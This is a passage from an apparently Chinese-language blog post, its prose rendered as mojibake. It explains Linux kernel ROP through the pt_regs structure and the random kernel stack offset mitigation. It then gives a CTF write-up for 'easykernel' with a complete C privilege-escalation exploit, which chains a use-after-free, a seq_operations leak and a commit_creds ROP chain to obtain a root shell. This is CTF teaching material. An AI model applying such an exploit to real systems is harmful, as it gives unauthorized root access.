<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pt_regs</span> &#123;</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span><br><span class="hljs-comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span><br><span class="hljs-comment"> */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r15;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r14;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r13;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r12;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rbp;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rbx;<br><span class="hljs-comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r11;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r10;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r9;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r8;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rax;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rcx;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rdx;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rsi;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rdi;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span><br><span class="hljs-comment"> * On hw interrupt, it&#x27;s IRQ number:</span><br><span class="hljs-comment"> */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> orig_rax;<br><span class="hljs-comment">/* Return frame for iretq */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rip;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> cs;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> eflags;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rsp;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ss;<br><span class="hljs-comment">/* top of stack page */</span><br>&#125;;<br></code></pre></td></tr></table></figure>

<p>åœ¨å†…æ ¸æ ˆä¸Šçš„ç»“æ„å¦‚ä¸‹ï¼š</p>
<p><img src="https://i.loli.net/2021/11/14/NwjgEMse8cTCdLr.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h3 id="å†…æ ¸æ ˆ-ä¸é€šç”¨-ROP"><a href="#å†…æ ¸æ ˆ-ä¸é€šç”¨-ROP" class="headerlink" title="å†…æ ¸æ ˆ ä¸é€šç”¨ ROP"></a>å†…æ ¸æ ˆ ä¸é€šç”¨ ROP</h3><p>æˆ‘ä»¬éƒ½çŸ¥é“ï¼Œå†…æ ¸æ ˆ<strong>åªæœ‰ä¸€ä¸ªé¡µé¢çš„å¤§å°</strong>ï¼Œè€Œ pt_regs ç»“æ„ä½“åˆ™å›ºå®šä½äº<strong>å†…æ ¸æ ˆæ ˆåº•</strong>ï¼Œå½“æˆ‘ä»¬åŠ«æŒå†…æ ¸ç»“æ„ä½“ä¸­çš„æŸä¸ªå‡½æ•°æŒ‡é’ˆæ—¶ï¼ˆä¾‹å¦‚ seq_operations-&gt;startï¼‰ï¼Œåœ¨æˆ‘ä»¬é€šè¿‡è¯¥å‡½æ•°æŒ‡é’ˆåŠ«æŒå†…æ ¸æ‰§è¡Œæµæ—¶ <strong>rsp ä¸ æ ˆåº•çš„ç›¸å¯¹åç§»é€šå¸¸æ˜¯ä¸å˜çš„</strong></p>
<p>è€Œåœ¨ç³»ç»Ÿè°ƒç”¨å½“ä¸­è¿‡ç¨‹æœ‰å¾ˆå¤šçš„å¯„å­˜å™¨å…¶å®æ˜¯ä¸ä¸€å®šèƒ½ç”¨ä¸Šçš„ï¼Œæ¯”å¦‚ r8 ~ r15ï¼Œ<strong>è¿™äº›å¯„å­˜å™¨ä¸ºæˆ‘ä»¬å¸ƒç½® ROP é“¾æä¾›äº†å¯èƒ½ï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°ï¼š</strong></p>
<ul>
<li><strong>åªéœ€è¦å¯»æ‰¾åˆ°ä¸€æ¡å½¢å¦‚ â€œadd rsp, val ; retâ€ çš„ gadget ä¾¿èƒ½å¤Ÿå®Œæˆ ROP</strong></li>
</ul>
<p>è¿™æ˜¯ä¸€ä¸ªé€šç”¨çš„ ROP æ¿å­ï¼Œæ–¹ä¾¿è°ƒè¯•æ—¶è§‚å¯Ÿï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">__asm__(<br>    <span class="hljs-string">&quot;mov r15,   0xbeefdead;&quot;</span><br>    <span class="hljs-string">&quot;mov r14,   0x11111111;&quot;</span><br>    <span class="hljs-string">&quot;mov r13,   0x22222222;&quot;</span><br>    <span class="hljs-string">&quot;mov r12,   0x33333333;&quot;</span><br>    <span class="hljs-string">&quot;mov rbp,   0x44444444;&quot;</span><br>    <span class="hljs-string">&quot;mov rbx,   0x55555555;&quot;</span><br>    <span class="hljs-string">&quot;mov r11,   0x66666666;&quot;</span><br>    <span class="hljs-string">&quot;mov r10,   0x77777777;&quot;</span><br>    <span class="hljs-string">&quot;mov r9,    0x88888888;&quot;</span><br>    <span class="hljs-string">&quot;mov r8,    0x99999999;&quot;</span><br>    <span class="hljs-string">&quot;xor rax,   rax;&quot;</span><br>    <span class="hljs-string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span><br>    <span class="hljs-string">&quot;mov rdx,   8;&quot;</span><br>    <span class="hljs-string">&quot;mov rsi,   rsp;&quot;</span><br>    <span class="hljs-string">&quot;mov rdi,   seq_fd;&quot;</span>        <span class="hljs-comment">// è¿™é‡Œå‡å®šé€šè¿‡ seq_operations-&gt;stat æ¥è§¦å‘</span><br>    <span class="hljs-string">&quot;syscall&quot;</span><br>);<br></code></pre></td></tr></table></figure>

<h3 id="æ–°ç‰ˆæœ¬å†…æ ¸å¯¹æŠ—åˆ©ç”¨-pt-regs-è¿›è¡Œæ”»å‡»çš„åŠæ³•"><a href="#æ–°ç‰ˆæœ¬å†…æ ¸å¯¹æŠ—åˆ©ç”¨-pt-regs-è¿›è¡Œæ”»å‡»çš„åŠæ³•" class="headerlink" title="æ–°ç‰ˆæœ¬å†…æ ¸å¯¹æŠ—åˆ©ç”¨ pt_regs è¿›è¡Œæ”»å‡»çš„åŠæ³•"></a>æ–°ç‰ˆæœ¬å†…æ ¸å¯¹æŠ—åˆ©ç”¨ pt_regs è¿›è¡Œæ”»å‡»çš„åŠæ³•</h3><p>æ­£æ‰€è°“é­”é«˜ä¸€å°ºé“é«˜ä¸€ä¸ˆï¼Œå†…æ ¸ä¸»çº¿åœ¨ <a target="_blank" rel="noopener" href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=eea2647e74cd7bd5d04861ce55fa502de165de14">è¿™ä¸ª commit</a> ä¸­ä¸ºç³»ç»Ÿè°ƒç”¨æ ˆ<strong>æ·»åŠ äº†ä¸€ä¸ªåç§»å€¼ï¼Œè¿™æ„å‘³ç€ pt_regs ä¸æˆ‘ä»¬è§¦å‘åŠ«æŒå†…æ ¸æ‰§è¡Œæµæ—¶çš„æ ˆé—´åç§»å€¼ä¸å†æ˜¯å›ºå®šå€¼</strong></p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-comment">diff --git a/arch/x86/entry/common.c b/arch/x86/entry/common.c</span><br><span class="hljs-comment">index 4efd39aacb9f2..7b2542b13ebd9 100644</span><br><span class="hljs-comment">--- a/arch/x86/entry/common.c</span><br><span class="hljs-comment">+++ b/arch/x86/entry/common.c</span><br><span class="hljs-meta">@@ -38,6 +38,7 @@</span><br> #ifdef CONFIG_X86_64<br> __visible noinstr void do_syscall_64(unsigned long nr, struct pt_regs *regs)<br> &#123;<br><span class="hljs-addition">+    add_random_kstack_offset();</span><br>     nr = syscall_enter_from_user_mode(regs, nr);<br><br>     instrumentation_begin();<br></code></pre></td></tr></table></figure>

<p>å½“ç„¶ï¼Œè‹¥æ˜¯åœ¨è¿™ä¸ªéšæœºåç§»å€¼è¾ƒå°ä¸”æˆ‘ä»¬ä»æœ‰è¶³å¤Ÿå¤šçš„å¯„å­˜å™¨å¯ç”¨çš„æƒ…å†µä¸‹ï¼Œä»ç„¶å¯ä»¥é€šè¿‡å¸ƒç½®ä¸€äº› slide gadget æ¥ç»§ç»­å®Œæˆåˆ©ç”¨ï¼Œä¸è¿‡ç¨³å®šæ€§ä¹Ÿå¤§å¹…ä¸‹é™äº†ï¼Œ <em>å¯ä»¥è¯´è¿™ç§åˆ©ç”¨æ–¹å¼åŸºæœ¬ä¸Šæ˜¯åºŸäº†</em></p>
<h3 id="ä¾‹é¢˜ï¼šè¥¿æ¹–è®ºå‰‘2021çº¿ä¸Šåˆèµ›-easykernel"><a href="#ä¾‹é¢˜ï¼šè¥¿æ¹–è®ºå‰‘2021çº¿ä¸Šåˆèµ›-easykernel" class="headerlink" title="ä¾‹é¢˜ï¼šè¥¿æ¹–è®ºå‰‘2021çº¿ä¸Šåˆèµ› - easykernel"></a><em>ä¾‹é¢˜ï¼šè¥¿æ¹–è®ºå‰‘2021çº¿ä¸Šåˆèµ› - easykernel</em></h3><p>ä»Šå¹´çš„è¥¿æ¹–è®ºå‰‘çš„å®£ä¼ æ¯”ä»¥å¾€çš„é˜µåŠ¿è¦å¤§å¾—å¤šï¼Œç¬”è€…åœ¨å­¦æ ¡é¥­å ‚åƒå®Œé¥­å‡ºæ¥éƒ½èƒ½ç¢°åˆ°å‘ä¼ å•çš„ï¼Œè¿™ä¸€æ¬¡ç¬”è€…ä¸ç¬”è€…çš„é˜Ÿå‹ä¹Ÿå‚åŠ äº†æœ¬æ¬¡çš„è¥¿æ¹–è®ºå‰‘CTFï¼Œå…¶ä¸­æœ‰ä¸€é“ easykernl ç®—æ˜¯ä¸€é“è´¨é‡è¿˜å¯ä»¥çš„çš„ kernel pwn å…¥é—¨é¢˜ï¼Œå¯æƒœåœ¨æ¯”èµ›æ—¶ç¬”è€…æ‰‹æ…¢ä¸€æ­¥åªæ‹¿åˆ°äº†ä¸‰è¡€</p>
<p>é—²è¯ä¸å¤šè¯´ï¼Œä»¥ä¸‹æ˜¯é¢˜è§£</p>
<h4 id="â‘ -åˆ†æ-3"><a href="#â‘ -åˆ†æ-3" class="headerlink" title="â‘  åˆ†æ"></a>â‘  åˆ†æ</h4><p>é¦–å…ˆæŸ¥çœ‹å¯åŠ¨è„šæœ¬</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br><br>qemu-system-x86_64  \<br>-m 64M \<br>-cpu kvm64,+smep \<br>-kernel ./bzImage \<br>-initrd rootfs.img \<br>-nographic \<br>-s \<br>-append <span class="hljs-string">&quot;console=ttyS0 kaslr quiet noapic&quot;</span><br></code></pre></td></tr></table></figure>

<p>å¼€äº† SMEP å’Œ KASLR</p>
<p>è¿è¡Œå¯åŠ¨è„šæœ¬ï¼ŒæŸ¥çœ‹ <code>/sys/devices/system/cpu/vulnerabilities/*</code>ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">/ $ cat /sys/devices/system/cpu/vulnerabilities/*<br>KVM: Mitigation: VMX unsupported<br>Mitigation: PTE Inversion<br>Vulnerable: Clear CPU buffers attempted, no microcode; SMT Host state unknown<br>Mitigation: PTI<br>Vulnerable<br>Mitigation: usercopy/swapgs barriers and __user pointer sanitization<br>Mitigation: Full generic retpoline, STIBP: disabled, RSB filling<br>Not affected<br>Not affected<br></code></pre></td></tr></table></figure>

<p>å¼€å¯äº† PTI ï¼ˆé¡µè¡¨éš”ç¦»ï¼‰</p>
<p>é¢˜ç›®ç»™äº†ä¸ª test.koï¼ŒæŒ‰æƒ¯ä¾‹è¿™å°±æ˜¯æœ‰æ¼æ´çš„ LKM</p>
<p>æ‹–å…¥ IDA è¿›è¡Œåˆ†æï¼Œå‘ç°åªå®šä¹‰äº† ioctlï¼Œå¯ä»¥çœ‹å‡ºæ˜¯å¸¸è§çš„â€œèœå•å †â€ï¼Œç»™å‡ºäº†åˆ†é…ã€é‡Šæ”¾ã€è¯»ã€å†™ object çš„åŠŸèƒ½</p>
<p><img src="https://i.loli.net/2021/11/20/y7KwuZB3tTehGHP.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>å¯¹äºåˆ†é… objectï¼Œæˆ‘ä»¬éœ€è¦ä¼ å…¥å¦‚ä¸‹å½¢å¼ç»“æ„ä½“ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">size_t</span> size;<br>    <span class="hljs-type">void</span> *buf;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>å¯¹äºé‡Šæ”¾ã€è¯»ã€å†™ objectï¼Œåˆ™éœ€è¦ä¼ å…¥å¦‚ä¸‹å½¢å¼ç»“æ„ä½“</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">size_t</span> idx;<br>    <span class="hljs-type">size_t</span> size;<br>    <span class="hljs-type">void</span> *buf;<br>&#125;;<br></code></pre></td></tr></table></figure>

<h5 id="åˆ†é…ï¼š0x20"><a href="#åˆ†é…ï¼š0x20" class="headerlink" title="åˆ†é…ï¼š0x20"></a>åˆ†é…ï¼š0x20</h5><p>æ¯”è¾ƒå¸¸è§„çš„ kmallocï¼Œæ²¡æœ‰é™åˆ¶sizeï¼Œæœ€å¤šå¯ä»¥åˆ†é… 0x20 ä¸ª chunk</p>
<p><img src="https://i.loli.net/2021/11/20/hzcYQx6OD7uVP5T.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h5 id="é‡Šæ”¾ï¼š0x30"><a href="#é‡Šæ”¾ï¼š0x30" class="headerlink" title="é‡Šæ”¾ï¼š0x30"></a>é‡Šæ”¾ï¼š0x30</h5><p><strong>kfree ä»¥åæ²¡æœ‰æ¸…ç©ºæŒ‡é’ˆï¼Œç›´æ¥å°±æœ‰ä¸€ä¸ªè£¸çš„ UAF ç³Šè„¸</strong></p>
<p><img src="https://i.loli.net/2021/11/20/jGy6mShgPAIJeQN.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h5 id="è¯»ï¼š0x40"><a href="#è¯»ï¼š0x40" class="headerlink" title="è¯»ï¼š0x40"></a>è¯»ï¼š0x40</h5><p>ä¼šè°ƒç”¨ show å‡½æ•°</p>
<p><img src="https://i.loli.net/2021/11/20/MKeuzEXod94lI12.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>å…¶å®å°±æ˜¯å¥—äº†ä¸€å±‚çš®çš„è¯» object å†…å®¹ï¼ŒåŠ äº†ä¸€ç‚¹ç‚¹è¶Šç•Œæ£€æŸ¥</p>
<p><img src="https://i.loli.net/2021/11/20/5RsVwHToCYXdAIa.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h5 id="å†™ï¼š0x50"><a href="#å†™ï¼š0x50" class="headerlink" title="å†™ï¼š0x50"></a>å†™ï¼š0x50</h5><p>å¸¸è§„çš„å†™å…¥ objectï¼ŒåŠ äº†ä¸€ç‚¹ç‚¹æ£€æŸ¥</p>
<p><img src="https://i.loli.net/2021/11/20/VFX2SgEn6YR9v3M.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h4 id="â‘¡-è§£æ³•ï¼šUAF-seq-operations-pt-regs-ROP"><a href="#â‘¡-è§£æ³•ï¼šUAF-seq-operations-pt-regs-ROP" class="headerlink" title="â‘¡ è§£æ³•ï¼šUAF + seq_operations + pt_regs + ROP"></a>â‘¡ è§£æ³•ï¼šUAF + seq_operations + pt_regs + ROP</h4><p>é¢˜ç›®æ²¡æœ‰è¯´æ˜ï¼Œé‚£ç¬”è€…é»˜è®¤åº”è¯¥æ˜¯æ²¡å¼€ Hardened Freelistï¼Œç°åœ¨åˆæœ‰ UAFï¼Œé‚£ä¹ˆè§£æ³•å°±æ˜¯å¤šç§å¤šæ ·çš„äº†ï¼Œç¬”è€…è¿™é‡Œé€‰æ‹©ç”¨ <code>seq_operations</code> + <code>pt_regs</code> æ„é€  ROP è¿›è¡Œææƒ</p>
<p>exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stddef.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff810c8d40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SEQ_OPS_0 0xffffffff81319d30</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_CRED 0xffffffff82663300</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff81089250</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00f30</span><br><br><span class="hljs-type">long</span> dev_fd;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">op_chunk</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">size_t</span>  idx;<br>    <span class="hljs-type">size_t</span>  size;<br>    <span class="hljs-type">void</span>    *buf;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">alloc_chunk</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">size_t</span>  size;<br>    <span class="hljs-type">void</span>    *buf;<br>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">readChunk</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx, <span class="hljs-type">size_t</span> size, <span class="hljs-type">void</span> *buf)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">op_chunk</span> <span class="hljs-title">op</span> =</span> <br>    &#123;<br>        .idx = idx,<br>        .size = size,<br>        .buf = buf,<br>    &#125;;<br>    ioctl(dev_fd, <span class="hljs-number">0x40</span>, &amp;op);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">writeChunk</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx, <span class="hljs-type">size_t</span> size, <span class="hljs-type">void</span> *buf)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">op_chunk</span> <span class="hljs-title">op</span> =</span> <br>    &#123;<br>        .idx = idx,<br>        .size = size,<br>        .buf = buf,<br>    &#125;;<br>    ioctl(dev_fd, <span class="hljs-number">0x50</span>, &amp;op);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">deleteChunk</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">op_chunk</span> <span class="hljs-title">op</span> =</span> <br>    &#123;<br>        .idx = idx,<br>    &#125;;<br>    ioctl(dev_fd, <span class="hljs-number">0x30</span>, &amp;op);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">allocChunk</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size, <span class="hljs-type">void</span> *buf)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">alloc_chunk</span> <span class="hljs-title">alloc</span> =</span> <br>    &#123;<br>        .size = size,<br>        .buf = buf,<br>    &#125;;<br>    ioctl(dev_fd, <span class="hljs-number">0x20</span>, &amp;alloc);<br>&#125;<br><br><span class="hljs-type">size_t</span>      buf[<span class="hljs-number">0x100</span>];<br><span class="hljs-type">size_t</span>      swapgs_restore_regs_and_return_to_usermode;<br><span class="hljs-type">size_t</span>      init_cred;<br><span class="hljs-type">size_t</span>      pop_rdi_ret;<br><span class="hljs-type">long</span>        seq_fd;<br><span class="hljs-type">void</span> *      kernel_base = <span class="hljs-number">0xffffffff81000000</span>;<br><span class="hljs-type">size_t</span>      kernel_offset = <span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span>      commit_creds;<br><span class="hljs-type">size_t</span>      gadget;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> ** argv, <span class="hljs-type">char</span> ** envp)</span><br>&#123;<br>    dev_fd = open(<span class="hljs-string">&quot;/dev/kerpwn&quot;</span>, O_RDWR);<br><br>    allocChunk(<span class="hljs-number">0x20</span>, buf);<br>    deleteChunk(<span class="hljs-number">0</span>);<br>    seq_fd = open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);<br>    readChunk(<span class="hljs-number">0</span>, <span class="hljs-number">0x20</span>, buf);<br><br>    kernel_offset = buf[<span class="hljs-number">0</span>] - SEQ_OPS_0;<br>    kernel_base += kernel_offset;<br>    swapgs_restore_regs_and_return_to_usermode = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + kernel_offset;<br>    init_cred = INIT_CRED + kernel_offset;<br>    pop_rdi_ret = POP_RDI_RET + kernel_offset;<br>    commit_creds = COMMIT_CREDS + kernel_offset;<br>    gadget = <span class="hljs-number">0xffffffff8135b0f6</span> + kernel_offset; <span class="hljs-comment">// add rsp ä¸€ä¸ªæ•°ç„¶å pop ä¸€å †å¯„å­˜å™¨æœ€åretï¼Œå…·ä½“çš„ä¸è®°å¾—äº†ï¼Œæ‡’å¾—å†å›å»ç¿»äº†</span><br><br>    buf[<span class="hljs-number">0</span>] = gadget;<br>    swapgs_restore_regs_and_return_to_usermode += <span class="hljs-number">9</span>;<br>    writeChunk(<span class="hljs-number">0</span>, <span class="hljs-number">0x20</span>, buf);<br><br>    __asm__(<br>        <span class="hljs-string">&quot;mov r15, 0xbeefdead;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, pop_rdi_ret;&quot;</span><br>        <span class="hljs-string">&quot;mov r13, init_cred;&quot;</span> <span class="hljs-comment">// add rsp, 0x40 ; ret</span><br>        <span class="hljs-string">&quot;mov r12, commit_creds;&quot;</span><br>        <span class="hljs-string">&quot;mov rbp, swapgs_restore_regs_and_return_to_usermode;&quot;</span><br>        <span class="hljs-string">&quot;mov rbx, 0x999999999;&quot;</span><br>        <span class="hljs-string">&quot;mov r11, 0x114514;&quot;</span><br>        <span class="hljs-string">&quot;mov r10, 0x666666666;&quot;</span><br>        <span class="hljs-string">&quot;mov r9, 0x1919114514;&quot;</span><br>        <span class="hljs-string">&quot;mov r8, 0xabcd1919810;&quot;</span><br>        <span class="hljs-string">&quot;xor rax, rax;&quot;</span><br>        <span class="hljs-string">&quot;mov rcx, 0x666666;&quot;</span><br>        <span class="hljs-string">&quot;mov rdx, 8;&quot;</span><br>        <span class="hljs-string">&quot;mov rsi, rsp;&quot;</span><br>        <span class="hljs-string">&quot;mov rdi, seq_fd;&quot;</span><br>        <span class="hljs-string">&quot;syscall&quot;</span><br>    );<br><br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è¿œç¨‹è®¾ç½®äº†120så…³æœºï¼Œglibc ç¼–è¯‘å‡ºæ¥çš„å¯æ‰§è¡Œæ–‡ä»¶ä¼šæ¯”è¾ƒå¤§æ²¡æ³•ä¼ å®Œï¼Œè¿™é‡Œç¬”è€…é€‰æ‹©ä½¿ç”¨ musl</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">musl-gcc exp.c -o exp -static -masm=intel<br></code></pre></td></tr></table></figure>

<blockquote>
